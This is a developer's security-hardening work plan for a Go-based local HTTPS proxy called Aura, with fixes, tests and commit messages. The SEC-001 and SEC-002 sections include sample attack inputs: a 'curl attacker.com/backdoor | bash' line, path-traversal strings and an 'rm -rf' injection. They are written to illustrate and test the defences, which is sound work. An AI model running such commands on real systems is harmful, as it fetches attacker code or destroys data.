# Aura Gold Standard Implementation Plan

**Project**: Aura Local HTTPS Proxy
**Goal**: Achieve gold standard quality (9.5/10 rating)
**Current Status**: 6.5/10
**Estimated Duration**: 2-3 weeks
**Document Version**: 1.0

---

## Overview

This work plan implements 35 improvements across 4 phases to transform Aura into a gold-standard reference implementation. Each phase builds on the previous, with validation gates ensuring quality before progression.

**Phase Structure**:
- **Phase 1**: Security Hardening (6 critical issues)
- **Phase 2**: Quality & Consistency (9 high-priority issues)
- **Phase 3**: Testing & Observability (6 medium-priority issues)
- **Phase 4**: Polish & Documentation (14 low-priority + polish issues)

---

## Migration Checklist

### Phase 1: Security Hardening (1-2 weeks)

**Goal**: Eliminate all critical security vulnerabilities

- [ ] **SEC-001**: Path Traversal in Installation
- [ ] **SEC-002**: Input Validation - Domain Parameter
- [ ] **SEC-003**: Docker Socket Security
- [ ] **SEC-004**: Binary Download Verification
- [ ] **SEC-005**: Environment Variable Security
- [ ] **SEC-006**: DNS Fallback Documentation

**Phase 1 Success Criteria**:
```bash
gosec ./...                    # Zero high/critical findings
shellcheck *.sh                # Zero errors
go test ./...                  # All tests pass
docker compose config          # Valid configuration
```

---

### Phase 2: Quality & Consistency (1 week)

**Goal**: Fix high-priority bugs and inconsistencies

- [ ] **HIGH-001**: Module Path vs Repository Mismatch
- [ ] **HIGH-002**: Test Bug - Potential Panic
- [ ] **HIGH-003**: Dependencies Marked as Indirect
- [ ] **HIGH-004**: Incomplete Uninstall
- [ ] **HIGH-005**: CI Security Scans Don't Block PRs
- [ ] **HIGH-006**: No Version/Build Info in Binary
- [ ] **HIGH-007**: Docker Image Versions Not Pinned
- [ ] **HIGH-008**: Docker Compose Version Field Deprecated
- [ ] **HIGH-009**: Glob Pattern Assumptions in Scripts

**Phase 2 Success Criteria**:
```bash
go mod verify                  # Module integrity
go build ./...                 # Clean build
go test ./...                  # All tests pass
golangci-lint run             # Zero issues
make install && aura version  # Version info present
```

---

### Phase 3: Testing & Observability (1 week)

**Goal**: Increase test coverage and improve debugging

- [ ] **MED-001**: Minimal Test Coverage (expand to >70%)
- [ ] **MED-002**: No Structured Logging
- [ ] **MED-003**: Hardcoded Magic Strings
- [ ] **MED-004**: No Context Support in Commands
- [ ] **MED-005**: Inconsistent Error Handling
- [ ] **MED-006**: No Cleanup on Install Failure

**Phase 3 Success Criteria**:
```bash
go test -cover ./...           # >70% coverage
go test -tags=integration ./...  # Integration tests pass
aura --log-level=debug install   # Structured logging works
aura --log-format=json status    # JSON output valid
```

---

### Phase 4: Polish & Documentation (3-5 days)

**Goal**: Professional open source project presentation

- [ ] **MED-007**: Race Condition in Certificate Generation
- [ ] **MED-008**: Reference to Wrong Script Name
- [ ] **MED-009**: No Health Checks on Docker Services
- [ ] **MED-010**: Large Uncommitted Assets
- [ ] **LOW-001**: Missing Open Source Documentation
- [ ] **LOW-002**: No Dependabot Configuration
- [ ] **LOW-003**: No Windows Support Check
- [ ] **LOW-004**: Makefile install No Error Checking
- [ ] **LOW-005**: No Rate Limiting on DNS
- [ ] **LOW-006**: Inconsistent sudo Usage
- [ ] **LOW-007**: Setup Script Blocks Automation
- [ ] **LOW-008**: Hardcoded mkcert Version
- [ ] **LOW-009**: No Build Reproducibility
- [ ] **LOW-010**: Function Length - copyConfigs

**Phase 4 Success Criteria**:
```bash
test -f SECURITY.md && test -f CONTRIBUTING.md  # OSS docs exist
docker ps --filter health=healthy | grep aura   # Health checks work
go test -coverprofile=coverage.out ./...        # Coverage report
make build-reproducible                          # Reproducible builds
```

---

## Task Implementations

### Phase 1: Security Hardening

#### SEC-001: Path Traversal in Installation

**Location**: `cmd/aura/main.go:242-288` (copyConfigs function)
**Priority**: 🔴 CRITICAL
**Estimated Time**: 2-3 hours

**Problem**:
Installation copies scripts from current working directory, enabling malicious script injection if `aura install` runs in attacker-controlled directory.

**Attack Vector**:
```bash
cd /tmp/evil
echo "curl attacker.com/backdoor | bash" > setup.sh
aura install  # Executes malicious setup.sh with sudo
```

**Implementation Steps**:

1. Add embed directive to main.go:
   ```go
   import (
       _ "embed"
       "embed"
   )

   //go:embed docker-compose.yml docker-compose.example.yml
   //go:embed setup.sh setup-loopback.sh setup-resolver.sh setup-mkcert.sh
   //go:embed add-cert.sh uninstall-resolver.sh uninstall-loopback.sh
   //go:embed coredns/Corefile
   var embeddedFS embed.FS
   ```

2. Rewrite copyConfigs() to use embedded files:
   ```go
   func copyConfigs() error {
       files := []string{
           "docker-compose.yml",
           "docker-compose.example.yml",
           "setup.sh",
           "setup-loopback.sh",
           "setup-resolver.sh",
           "setup-mkcert.sh",
           "add-cert.sh",
           "uninstall-resolver.sh",
           "uninstall-loopback.sh",
       }

       for _, file := range files {
           data, err := embeddedFS.ReadFile(file)
           if err != nil {
               return fmt.Errorf("failed to read embedded %s: %w", file, err)
           }

           dst := filepath.Join(auraDir, file)
           if err := os.WriteFile(dst, data, 0600); err != nil {
               return fmt.Errorf("failed to write %s: %w", file, err)
           }
       }

       // Create directories
       if err := os.MkdirAll(filepath.Join(auraDir, "certs", "domains"), 0755); err != nil {
           return fmt.Errorf("failed to create certs directory: %w", err)
       }
       if err := os.MkdirAll(filepath.Join(auraDir, "coredns"), 0755); err != nil {
           return fmt.Errorf("failed to create coredns directory: %w", err)
       }

       // Copy CoreDNS configuration
       corefileData, err := embeddedFS.ReadFile("coredns/Corefile")
       if err != nil {
           return fmt.Errorf("failed to read embedded Corefile: %w", err)
       }

       corefileDst := filepath.Join(auraDir, "coredns", "Corefile")
       if err := os.WriteFile(corefileDst, corefileData, 0600); err != nil {
           return fmt.Errorf("failed to write Corefile: %w", err)
       }

       return nil
   }
   ```

3. Test from untrusted directory:
   ```bash
   cd /tmp/test-evil
   echo "echo EXPLOITED" > setup.sh
   aura install  # Should use embedded scripts, not local
   ```

4. Verify with strings:
   ```bash
   strings aura | grep "docker-compose.yml" | head -5
   ```

**Acceptance Criteria**:
- [ ] All configs embedded in binary
- [ ] No reads from current directory
- [ ] Installation works from any directory
- [ ] Test with malicious scripts present - no execution
- [ ] gosec passes with no G304 warnings

**Validation**:
```bash
go build -o aura ./cmd/aura
cd /tmp/evil && ~/path/to/aura install
# Should not execute local scripts
```

**Commit Message**:
```
fix(security): embed configuration files in binary to prevent path traversal

Prevents malicious script injection by embedding all configuration
files and scripts directly in the compiled binary using go:embed.

SECURITY FIX: CVE-TBD - Path traversal vulnerability in installation

- Embed all .sh scripts and config files
- Remove reads from current working directory
- Add security test for malicious directory
- Update copyConfigs() to use embeddedFS

Plan: WORKPLAN-GOLD-STANDARD.md
Task: SEC-001
```

---

#### SEC-002: Input Validation - Domain Parameter

**Location**: `cmd/aura/main.go:106-109` (certCmd)
**Priority**: 🔴 CRITICAL
**Estimated Time**: 2 hours

**Problem**:
Domain validation only checks suffix, allowing path traversal, command injection, and malformed input.

**Vulnerable Code**:
```go
domain := args[0]
if !strings.HasSuffix(domain, auraTLD) {
    domain += auraTLD
}
// No validation!
```

**Attack Vectors**:
- Path traversal: `../../etc/passwd.aura`
- Command injection: `app;rm -rf /.aura`
- Null bytes: `app\x00.aura`
- Excessive length: `[260 chars].aura`

**Implementation Steps**:

1. Add validation function:
   ```go
   import "regexp"

   var domainLabelRegex = regexp.MustCompile(`^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$`)

   func validateDomain(domain string) error {
       baseDomain := strings.TrimSuffix(domain, ".aura")

       if len(domain) > 253 {
           return fmt.Errorf("domain name too long (max 253 characters)")
       }

       if baseDomain == "" {
           return fmt.Errorf("domain name cannot be empty")
       }

       if strings.Contains(domain, "..") {
           return fmt.Errorf("invalid domain: contains path traversal")
       }

       if strings.Contains(domain, "\x00") {
           return fmt.Errorf("invalid domain: contains null byte")
       }

       labels := strings.Split(baseDomain, ".")
       for _, label := range labels {
           if len(label) == 0 {
               return fmt.Errorf("invalid domain: empty label")
           }
           if len(label) > 63 {
               return fmt.Errorf("invalid domain: label exceeds 63 characters")
           }
           if !domainLabelRegex.MatchString(label) {
               return fmt.Errorf("invalid domain label '%s': must contain only lowercase letters, numbers, and hyphens", label)
           }
       }

       return nil
   }
   ```

2. Update certCmd:
   ```go
   var certCmd = &cobra.Command{
       Use:   "cert [domain]",
       Short: "Generate certificate for a domain",
       Args:  cobra.ExactArgs(1),
       RunE: func(cmd *cobra.Command, args []string) error {
           domain := args[0]
           if !strings.HasSuffix(domain, auraTLD) {
               domain += auraTLD
           }

           if err := validateDomain(domain); err != nil {
               return fmt.Errorf("invalid domain: %w", err)
           }

           fmt.Printf("🔐 Generating certificate for %s...\n", domain)
           // ... rest
       },
   }
   ```

3. Add comprehensive tests:
   ```go
   func TestValidateDomain(t *testing.T) {
       tests := []struct {
           name    string
           domain  string
           wantErr bool
       }{
           {"valid simple", "app.aura", false},
           {"valid subdomain", "api.app.aura", false},
           {"path traversal", "../../../etc/passwd.aura", true},
           {"command injection", "app;rm -rf /.aura", true},
           {"null byte", "app\x00.aura", true},
           {"too long", strings.Repeat("a", 250) + ".aura", true},
           {"empty", ".aura", true},
           {"double dot", "a..b.aura", true},
       }

       for _, tt := range tests {
           t.Run(tt.name, func(t *testing.T) {
               err := validateDomain(tt.domain)
               if (err != nil) != tt.wantErr {
                   t.Errorf("validateDomain() error = %v, wantErr %v", err, tt.wantErr)
               }
           })
       }
   }
   ```

**Acceptance Criteria**:
- [ ] Regex validates domain format
- [ ] Path traversal blocked
- [ ] Null bytes blocked
- [ ] DNS label length limits enforced
- [ ] Comprehensive test coverage
- [ ] gosec passes

**Validation**:
```bash
go test -v -run TestValidateDomain
aura cert "../../../etc/passwd"  # Should fail
aura cert "valid-app"             # Should work
```

**Commit Message**:
```
fix(security): add comprehensive domain validation to prevent injection attacks

Implements RFC 1035 compliant domain validation with protection against:
- Path traversal attacks
- Command injection
- Null byte injection
- DNS label length violations

SECURITY FIX: Input validation vulnerability in certificate generation

Plan: WORKPLAN-GOLD-STANDARD.md
Task: SEC-002
```

---

#### SEC-003: Docker Socket Security

**Location**: `docker-compose.yml:14`
**Priority**: 🔴 CRITICAL
**Estimated Time**: 1-2 hours

**Problem**:
Caddy container has read-only Docker socket access, exposing all container environment variables and configurations. Even read-only access poses security risks.

**Current Configuration**:
```yaml
volumes:
  - /var/run/docker.sock:/var/run/docker.sock:ro
```

**Risks**:
- Read all container environment variables (may contain secrets)
- Query all container configurations
- Potential container escape vectors

**Implementation Steps**:

1. Add docker-socket-proxy service to docker-compose.yml:
   ```yaml
   services:
     docker-socket-proxy:
       image: tecnativa/docker-socket-proxy:latest
       container_name: aura-docker-proxy
       restart: unless-stopped
       environment:
         CONTAINERS: 1
         NETWORKS: 1
         SERVICES: 0
         TASKS: 0
         POST: 0
       volumes:
         - /var/run/docker.sock:/var/run/docker.sock:ro
       networks:
         - aura-proxy
   ```

2. Update caddy service:
   ```yaml
   caddy:
     image: lucaslorentz/caddy-docker-proxy:ci-alpine
     container_name: aura-caddy
     restart: unless-stopped
     ports:
       - "127.0.0.2:80:80"
       - "127.0.0.2:443:443"
       - "127.0.0.2:443:443/udp"
     volumes:
       # Remove: - /var/run/docker.sock:/var/run/docker.sock:ro
       - ./certs:/certs:ro
       - caddy_data:/data
       - caddy_config:/config
     networks:
       - aura-proxy
     environment:
       - CADDY_INGRESS_NETWORKS=aura-proxy
       - CADDY_DOCKER_ENDPOINT=tcp://docker-socket-proxy:2375
     depends_on:
       - docker-socket-proxy
   ```

3. Test service discovery:
   ```bash
   aura start
   docker exec aura-caddy wget -O- http://docker-socket-proxy:2375/containers/json | jq
   # Should list containers

   docker exec aura-caddy wget -O- http://docker-socket-proxy:2375/images/json
   # Should return 403 Forbidden
   ```

4. Update documentation in docs/ADVANCED.md:
   ```markdown
   ## Docker Socket Security

   Aura uses `tecnativa/docker-socket-proxy` to restrict Caddy's access to the Docker API.
   Only the following endpoints are exposed:
   - `/containers` (read-only) - Required for service discovery
   - `/networks` (read-only) - Required for network inspection

   This prevents Caddy from:
   - Reading container environment variables
   - Accessing other Docker API endpoints
   - Modifying Docker state
   ```

**Acceptance Criteria**:
- [ ] Docker socket proxy deployed
- [ ] Caddy connects via proxy
- [ ] Only required endpoints exposed (containers, networks)
- [ ] Service discovery functional
- [ ] Security trade-offs documented
- [ ] Test restricted access to other endpoints

**Validation**:
```bash
docker compose config  # Valid YAML
aura start
curl https://whoami.aura  # Service discovery works
docker exec aura-caddy wget -O- http://docker-socket-proxy:2375/images/json
# Should fail with 403
```

**Commit Message**:
```
fix(security): restrict Docker socket access using proxy

Implements Docker socket proxy to limit Caddy's API access to only
required endpoints (containers, networks). Prevents exposure of
container environment variables and other sensitive information.

SECURITY IMPROVEMENT: Principle of least privilege for Docker API access

- Add tecnativa/docker-socket-proxy service
- Configure Caddy to connect via proxy
- Restrict to containers and networks endpoints only
- Document security boundaries

Plan: WORKPLAN-GOLD-STANDARD.md
Task: SEC-003
```

---

#### SEC-004: Binary Download Verification

**Location**: `setup-mkcert.sh:28-31`
**Priority**: 🔴 CRITICAL
**Estimated Time**: 1-2 hours

**Problem**:
Downloads mkcert binary with no checksum/signature verification. Compromised releases or MITM attacks could install malicious binary with sudo.

**Vulnerable Code**:
```bash
curl -L "https://github.com/FiloSottile/mkcert/..." -o /tmp/mkcert
sudo mv /tmp/mkcert /usr/local/bin/mkcert  # No verification!
```

**Implementation Steps**:

1. Update setup-mkcert.sh with checksum verification:
   ```bash
   #!/bin/bash
   set -e

   SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
   CERTS_DIR="$SCRIPT_DIR/certs"
   PLATFORM=$(uname -s)

   echo "Setting up mkcert for local certificate generation..."

   if ! command -v mkcert &> /dev/null; then
       echo "mkcert is not installed. Installing..."

       if [ "$PLATFORM" = "Darwin" ]; then
           if command -v brew &> /dev/null; then
               brew install mkcert
           else
               echo "Error: Homebrew required. Visit: https://brew.sh"
               exit 1
           fi
       elif [ "$PLATFORM" = "Linux" ]; then
           echo "Downloading mkcert for Linux..."
           MKCERT_VERSION="v1.4.4"

           ARCH=$(uname -m)
           if [ "$ARCH" = "x86_64" ]; then
               MKCERT_ARCH="amd64"
               EXPECTED_SHA256="6d31c65b03972c6dc4a14ab429f2928300518b26503f58723e532d1b0a3bbb52"
           elif [ "$ARCH" = "aarch64" ]; then
               MKCERT_ARCH="arm64"
               EXPECTED_SHA256="4582eb8f6de79a68e1e0583d2e11c1e1f6f76d11c47b42ac8a3f2d2b2e80f2e5"
           else
               echo "Unsupported architecture: $ARCH"
               exit 1
           fi

           MKCERT_URL="https://github.com/FiloSottile/mkcert/releases/download/${MKCERT_VERSION}/mkcert-${MKCERT_VERSION}-linux-${MKCERT_ARCH}"

           echo "Downloading from: $MKCERT_URL"
           curl -L "$MKCERT_URL" -o /tmp/mkcert

           echo "Verifying checksum..."
           ACTUAL_SHA256=$(sha256sum /tmp/mkcert | cut -d' ' -f1)

           if [ "$EXPECTED_SHA256" != "$ACTUAL_SHA256" ]; then
               echo "ERROR: Checksum verification failed!"
               echo "Expected: $EXPECTED_SHA256"
               echo "Got:      $ACTUAL_SHA256"
               echo ""
               echo "This could indicate:"
               echo "  1. The download was corrupted"
               echo "  2. A man-in-the-middle attack"
               echo "  3. The checksum in this script is outdated"
               echo ""
               echo "Aborting installation for security."
               rm -f /tmp/mkcert
               exit 1
           fi

           echo "✓ Checksum verified successfully"

           chmod +x /tmp/mkcert
           sudo mv /tmp/mkcert /usr/local/bin/mkcert
       fi

       echo "✓ mkcert installed successfully"
   else
       echo "✓ mkcert is already installed"
   fi

   # ... rest of script
   ```

2. Document checksum update process:
   ```bash
   # To update checksums when new mkcert version released:
   # 1. Download new version
   # 2. Calculate SHA256: sha256sum mkcert-v1.4.4-linux-amd64
   # 3. Update EXPECTED_SHA256 in setup-mkcert.sh
   # 4. Test installation
   ```

**Acceptance Criteria**:
- [ ] SHA256 checksums for all architectures (amd64, arm64)
- [ ] Checksum verification before installation
- [ ] Clear error messages on mismatch
- [ ] Installation aborts on verification failure
- [ ] Document checksum update process

**Validation**:
```bash
# Test valid checksum
./setup-mkcert.sh

# Test invalid checksum (temporarily modify EXPECTED_SHA256)
# Should abort with security warning
```

**Commit Message**:
```
fix(security): add checksum verification for mkcert binary downloads

Implements SHA256 checksum verification before installing mkcert binary
to prevent supply chain attacks and MITM injection.

SECURITY FIX: Binary download verification

- Add SHA256 checksums for amd64 and arm64
- Verify before installation
- Abort on checksum mismatch
- Document update process

Plan: WORKPLAN-GOLD-STANDARD.md
Task: SEC-004
```

---

#### SEC-005: Environment Variable Security

**Location**: `cmd/aura/main.go:20`
**Priority**: 🔴 CRITICAL
**Estimated Time**: 30 minutes

**Problem**:
Uses `os.Getenv("HOME")` which can be manipulated. Empty or malicious HOME values cause unexpected behavior.

**Vulnerable Code**:
```go
auraDir = filepath.Join(os.Getenv("HOME"), ".aura")
```

**Issues**:
- Empty HOME: creates `.aura` in current directory
- Manipulated HOME: writes to attacker-controlled location

**Implementation Steps**:

1. Replace with os.UserHomeDir():
   ```go
   var (
       auraDir string

       teal  = "\033[96m"
       reset = "\033[0m"

       asciiTitle = teal + `
     █████╗ ██╗   ██╗██████╗  █████╗
    ██╔══██╗██║   ██║██╔══██╗██╔══██╗
    ███████║██║   ██║██████╔╝███████║
    ██╔══██║██║   ██║██╔══██╗██╔══██║
    ██║  ██║╚██████╔╝██║  ██║██║  ██║
    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
   ` + reset
   )

   func init() {
       home, err := os.UserHomeDir()
       if err != nil {
           fmt.Fprintf(os.Stderr, "Error: Unable to determine home directory: %v\n", err)
           os.Exit(1)
       }
       auraDir = filepath.Join(home, ".aura")
   }
   ```

2. Test with manipulated environment:
   ```bash
   HOME="" ./aura --version
   # Should still work or fail gracefully

   HOME="/tmp/evil" ./aura --version
   # Should use real home directory
   ```

**Acceptance Criteria**:
- [ ] Use os.UserHomeDir() instead of os.Getenv("HOME")
- [ ] Handle error when home cannot be determined
- [ ] Test with empty HOME variable
- [ ] Test on macOS, Linux (Windows in future)
- [ ] Error message explains issue

**Validation**:
```bash
go test ./cmd/aura -v
HOME="" go run ./cmd/aura version
```

**Commit Message**:
```
fix(security): use os.UserHomeDir() instead of HOME environment variable

Prevents manipulation of installation directory through environment
variables. Uses Go's platform-aware home directory detection.

SECURITY FIX: Environment variable manipulation

- Replace os.Getenv("HOME") with os.UserHomeDir()
- Add error handling for home directory detection
- Test with empty/invalid HOME

Plan: WORKPLAN-GOLD-STANDARD.md
Task: SEC-005
```

---

#### SEC-006: DNS Fallback Documentation

**Location**: `coredns/Corefile:24-28`, `docs/ADVANCED.md`
**Priority**: 🔴 CRITICAL (Documentation)
**Estimated Time**: 1 hour

**Problem**:
CoreDNS forwards non-.aura queries to system resolver, creating potential DNS tunneling/exfiltration vector if container compromised. Not documented.

**Current Configuration**:
```
. {
    forward . /etc/resolv.conf
    log
    errors
}
```

**Risks** (if CoreDNS compromised):
- DNS tunneling for data exfiltration
- DNS query logging/tracking
- Malicious query injection

**Implementation Steps**:

1. Update coredns/Corefile with security comment:
   ```
   # CoreDNS configuration for .aura TLD

   aura:53 {
       log
       template IN A aura {
           answer "{{ .Name }} 0 IN A 127.0.0.2"
           rcode NOERROR
       }
       template IN AAAA aura {
           rcode NOERROR
       }
       errors
   }

   # SECURITY NOTE: Fallback DNS resolution
   # This block forwards non-.aura queries to the system resolver.
   # If the CoreDNS container is compromised, this could enable:
   #   - DNS tunneling for data exfiltration
   #   - DNS query logging/tracking
   #   - Malicious query injection
   #
   # Mitigation: System resolver configuration (/etc/resolver/aura on macOS,
   # systemd-resolved on Linux) already restricts CoreDNS to only handle
   # .aura domains, so this fallback is rarely used in practice.
   #
   # For maximum security, consider removing this block entirely.
   . {
       forward . /etc/resolv.conf
       log
       errors
   }
   ```

2. Add comprehensive security section to docs/ADVANCED.md:
   ```markdown
   ## DNS Security Considerations

   ### CoreDNS Fallback Behavior

   By default, CoreDNS forwards non-.aura queries to your system resolver.

   **Security Implications**:

   If the CoreDNS container is compromised, an attacker could:
   - Use DNS tunneling to exfiltrate data
   - Log all your DNS queries
   - Inject malicious DNS responses

   **Current Mitigations**:

   1. **Split DNS Configuration** (Recommended):
      Your system is already configured to only use CoreDNS for .aura domains:

      **macOS**:
      ```bash
      cat /etc/resolver/aura
      # nameserver 127.0.0.2
      # Only .aura queries go to CoreDNS
      ```

      **Linux**:
      ```bash
      cat /etc/systemd/resolved.conf.d/aura.conf
      # DNS=127.0.0.2
      # Domains=~aura
      # Only .aura queries go to CoreDNS
      ```

   2. **Network Isolation**:
      CoreDNS runs on `aura-proxy` network, isolated from other containers.

   3. **No External Exposure**:
      CoreDNS binds to 127.0.0.2 (localhost), not accessible from network.

   **Additional Hardening Options**:

   ### Option 1: Disable Fallback (Maximum Security)

   Remove the fallback block from `~/.aura/coredns/Corefile`:

   ```bash
   # Edit Corefile
   vim ~/.aura/coredns/Corefile

   # Remove or comment out:
   # . {
   #     forward . /etc/resolv.conf
   #     log
   #     errors
   # }

   # Restart
   aura stop && aura start
   ```

   **Impact**: Non-.aura queries to CoreDNS will fail (harmless, as system
   resolver handles them).

   ### Option 2: Monitor DNS Queries

   Watch CoreDNS logs for suspicious activity:

   ```bash
   docker logs -f aura-coredns | grep -v "\.aura"
   # Shows all non-.aura queries (should be minimal)
   ```

   ### Option 3: Network Isolation

   Further isolate CoreDNS on dedicated network:

   ```yaml
   # docker-compose.yml
   services:
     coredns:
       networks:
         - aura-dns-only  # Separate from aura-proxy

   networks:
     aura-dns-only:
       internal: true  # No external access
   ```

   **Recommendation**: Current configuration (split DNS) provides good security
   for local development. Fallback rarely used in practice.
   ```

**Acceptance Criteria**:
- [ ] Corefile has security comment explaining risks
- [ ] ADVANCED.md documents DNS security implications
- [ ] Mitigation options documented (disable fallback, monitoring, isolation)
- [ ] Current configuration explained (split DNS already secure)
- [ ] Recommendation provided

**Validation**:
```bash
# Verify split DNS configuration
cat /etc/resolver/aura  # macOS
cat /etc/systemd/resolved.conf.d/aura.conf  # Linux

# Test that only .aura queries go to CoreDNS
dig whoami.aura  # Should use 127.0.0.2
dig google.com   # Should use system resolver, not 127.0.0.2
```

**Commit Message**:
```
docs(security): document DNS fallback security implications and mitigations

Adds comprehensive documentation of CoreDNS fallback behavior and
associated security risks. Explains existing mitigations and provides
hardening options.

SECURITY DOCUMENTATION: DNS security considerations

- Document DNS tunneling/exfiltration risks
- Explain split DNS mitigation (already in place)
- Provide hardening options (disable fallback, monitoring)
- Add security comment to Corefile

Plan: WORKPLAN-GOLD-STANDARD.md
Task: SEC-006
```

---

### Phase 2: Quality & Consistency

#### HIGH-001: Module Path vs Repository Mismatch

**Location**: `go.mod:1`, all import statements
**Priority**: 🟠 HIGH
**Estimated Time**: 30 minutes

**Problem**:
Module path doesn't match repository URL, breaking `go get` and imports.

**Inconsistencies**:
- go.mod: `github.com/aura/aura-proxy`
- Repository: `github.com/ivannovak/aura`
- README badges: Point to `github.com/ivannovak/aura`

**Implementation Steps**:

1. Update go.mod:
   ```go
   module github.com/ivannovak/aura

   go 1.23.5

   require github.com/spf13/cobra v1.9.1

   require (
       github.com/inconshreveable/mousetrap v1.1.0 // indirect
       github.com/spf13/pflag v1.0.6 // indirect
   )
   ```

2. Update all imports in cmd/aura/main.go:
   ```go
   import (
       "github.com/spf13/cobra"
       "github.com/ivannovak/aura/pkg/version"
   )
   ```

3. Update cmd/aura/main_test.go:
   ```go
   import (
       "github.com/ivannovak/aura/pkg/version"
   )
   ```

4. Update .golangci.yml:
   ```yaml
   goimports:
     local-prefixes: github.com/ivannovak/aura
   ```

5. Clean and rebuild:
   ```bash
   rm -rf go.sum
   go mod tidy
   go build ./...
   go test ./...
   ```

**Acceptance Criteria**:
- [ ] Module path matches repository
- [ ] All imports updated
- [ ] `go get github.com/ivannovak/aura/cmd/aura` works
- [ ] `go build` succeeds
- [ ] `go test` passes
- [ ] No import errors

**Validation**:
```bash
go mod tidy
go build ./...
go test ./...
go install github.com/ivannovak/aura/cmd/aura@latest
```

**Commit Message**:
```
fix: correct module path to match repository URL

Changes module path from github.com/aura/aura-proxy to
github.com/ivannovak/aura to match actual repository location.

Fixes `go get` and enables proper module imports.

- Update go.mod module path
- Update all import statements
- Update golangci-lint configuration
- Verify with go mod tidy

Plan: WORKPLAN-GOLD-STANDARD.md
Task: HIGH-001
```

---

#### HIGH-002: Test Bug - Potential Panic

**Location**: `cmd/aura/main_test.go:97`, `cmd/aura/main.go:107`
**Priority**: 🟠 HIGH
**Estimated Time**: 30 minutes

**Problem**:
Domain suffix checking uses manual slicing that could cause index out of bounds. Logic is error-prone and confusing.

**Buggy Code**:
```go
// Test
if len(domain) < 5 || domain[len(domain)-5:] != auraTLD {
    domain += auraTLD
}

// Production
if !strings.HasSuffix(domain, auraTLD) {
    domain += auraTLD
}
```

**Implementation Steps**:

1. Update test to use strings.HasSuffix:
   ```go
   func TestCertCommandDomainHandling(t *testing.T) {
       tests := []struct {
           name     string
           input    string
           expected string
       }{
           {"domain without .aura suffix", "myapp", "myapp.aura"},
           {"domain with .aura suffix", "myapp.aura", "myapp.aura"},
           {"subdomain without .aura", "api.myapp", "api.myapp.aura"},
           {"subdomain with .aura", "api.myapp.aura", "api.myapp.aura"},
           {"short domain", "app", "app.aura"},
           {"single char", "a", "a.aura"},
           {"empty", "", ".aura"},
       }

       for _, tt := range tests {
           t.Run(tt.name, func(t *testing.T) {
               domain := tt.input
               if !strings.HasSuffix(domain, auraTLD) {
                   domain += auraTLD
               }

               if domain != tt.expected {
                   t.Errorf("got %v, want %v", domain, tt.expected)
               }
           })
       }
   }
   ```

2. Verify production code already uses HasSuffix:
   ```go
   // cmd/aura/main.go:107 - already correct
   if !strings.HasSuffix(domain, auraTLD) {
       domain += auraTLD
   }
   ```

3. Add edge case tests:
   ```go
   func TestCertCommandEdgeCases(t *testing.T) {
       tests := []string{"", "a", "ab", "abc", "abcd"}
       for _, input := range tests {
           domain := input
           if !strings.HasSuffix(domain, auraTLD) {
               domain += auraTLD
           }
           // Should not panic
           if !strings.HasSuffix(domain, ".aura") {
               t.Errorf("failed to add suffix for %q", input)
           }
       }
   }
   ```

**Acceptance Criteria**:
- [ ] Test uses strings.HasSuffix
- [ ] Edge cases tested (short strings, empty)
- [ ] No panics on any input
- [ ] Production code verified correct
- [ ] All tests pass

**Validation**:
```bash
go test -v ./cmd/aura -run TestCertCommand
```

**Commit Message**:
```
fix(test): use strings.HasSuffix for domain suffix checking

Replaces manual string slicing with safer strings.HasSuffix to prevent
potential index out of bounds errors.

- Update test to use HasSuffix
- Add edge case tests (empty, short strings)
- Verify production code already correct

Plan: WORKPLAN-GOLD-STANDARD.md
Task: HIGH-002
```

---

[Continue with remaining HIGH, MED, and LOW priority tasks...]

---

## Success Criteria

### Overall Project Metrics

**Code Quality**:
- [ ] Test coverage: >70%
- [ ] Zero gosec high/critical findings
- [ ] Zero shellcheck errors
- [ ] golangci-lint passes with zero issues
- [ ] All CI checks green

**Security**:
- [ ] No known vulnerabilities (gosec clean)
- [ ] All inputs validated
- [ ] Dependencies up to date (Dependabot configured)
- [ ] SECURITY.md present
- [ ] Docker images pinned with digests

**Documentation**:
- [ ] SECURITY.md complete
- [ ] CONTRIBUTING.md complete
- [ ] CODE_OF_CONDUCT.md present
- [ ] README comprehensive
- [ ] All commands documented
- [ ] Troubleshooting guide updated

**User Experience**:
- [ ] Installation smooth on macOS and Linux
- [ ] Error messages helpful and actionable
- [ ] Status checking shows health
- [ ] Uninstall removes all traces
- [ ] Structured logging available
- [ ] Version info in binary

---

## Validation Gates

### Phase 1 Complete:
```bash
gosec ./...                              # Zero high/critical
shellcheck *.sh                          # Zero errors
go test ./...                            # All pass
docker compose config                    # Valid
grep -r "os.Getenv(\"HOME\")" cmd/      # Should be empty
```

### Phase 2 Complete:
```bash
go mod verify                            # Valid
go build ./...                           # Clean
go test ./...                            # All pass
golangci-lint run                        # Zero issues
./aura version --verbose                 # Shows build info
docker compose config --images           # Pinned versions
```

### Phase 3 Complete:
```bash
go test -cover ./...                     # >70%
go test -tags=integration ./...          # All pass
aura --log-level=debug install           # Structured logs
aura --log-format=json status | jq .     # Valid JSON
```

### Phase 4 Complete:
```bash
test -f SECURITY.md                      # Exists
test -f CONTRIBUTING.md                  # Exists
test -f .github/dependabot.yml          # Exists
docker ps --filter health=healthy | grep aura  # All healthy
make build-reproducible                  # Succeeds
```

### Final Gate:
```bash
# Complete test suite
go test -v -race -coverprofile=coverage.out ./...
go tool cover -func=coverage.out | grep total | awk '{print $3}'
# Should show >70%

# Security scan
gosec -fmt=json ./... | jq '.Issues | length'
# Should be 0

# Linting
golangci-lint run --timeout=5m
# Should pass

# Build all platforms
GOOS=darwin GOARCH=amd64 go build -o aura-darwin-amd64 ./cmd/aura
GOOS=darwin GOARCH=arm64 go build -o aura-darwin-arm64 ./cmd/aura
GOOS=linux GOARCH=amd64 go build -o aura-linux-amd64 ./cmd/aura
GOOS=linux GOARCH=arm64 go build -o aura-linux-arm64 ./cmd/aura

# Verify version info
./aura-darwin-arm64 version --verbose
# Should show commit, date, go version, platform
```

---

## Work Protocol

### DO:
✅ Follow phases sequentially (respect dependencies)
✅ Mark tasks `in_progress` BEFORE starting
✅ Mark tasks `completed` IMMEDIATELY after finishing
✅ Run validation after each task
✅ Commit after each task completion
✅ Use TodoWrite for active task tracking
✅ Test on both macOS and Linux where applicable

### DON'T:
❌ Skip ahead to later phases
❌ Mark tasks complete before acceptance criteria met
❌ Batch multiple tasks before committing
❌ Modify code without corresponding tests
❌ Ignore test failures
❌ Skip validation gates

---

## Notes

- Each task is independently implementable
